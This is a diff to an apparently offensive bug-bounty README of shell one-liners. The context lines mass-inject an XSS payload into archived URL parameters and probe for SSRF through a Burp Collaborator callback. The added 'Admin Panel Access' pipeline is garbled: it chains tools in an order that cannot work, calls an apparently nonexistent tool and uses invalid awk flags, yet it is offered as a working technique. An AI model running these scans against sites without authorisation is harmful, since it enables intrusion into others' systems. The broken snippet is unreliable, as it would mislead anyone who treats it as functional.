@@ -106,4 +106,11 @@ waybackurls target.com| grep '=' |qsreplace '"><script>alert(1)</script>' | whil
 cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
 ```
 
+**Admin Panel Access**
+
+```
+cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
+```
+
+
 **More Scripts Coming Sooon.....**
